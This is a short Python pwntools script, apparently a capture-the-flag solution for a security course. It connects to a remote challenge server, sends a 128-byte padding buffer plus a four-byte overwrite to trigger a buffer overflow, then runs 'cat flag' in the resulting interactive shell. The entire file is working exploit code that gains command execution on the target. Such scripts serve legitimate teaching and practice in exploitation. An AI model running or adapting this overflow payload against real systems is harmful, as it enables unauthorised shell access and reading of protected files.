from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 26949)

# 137 - 9 = 128
offset = 128

payload = "A".encode() * offset + bytes('1234', 'utf-8')

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()